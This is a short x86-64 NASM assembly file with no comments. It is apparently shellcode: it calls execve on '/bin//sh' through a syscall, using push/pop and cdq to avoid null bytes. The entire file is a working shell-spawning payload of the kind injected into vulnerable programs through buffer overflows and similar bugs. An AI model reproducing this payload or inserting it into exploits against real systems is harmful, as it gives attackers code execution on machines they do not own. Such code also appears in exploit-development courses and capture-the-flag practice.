BITS 64
global _start

section .text

_start:
    push 59
    pop rax
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    push rsp
    pop rdi
    cdq
    syscall
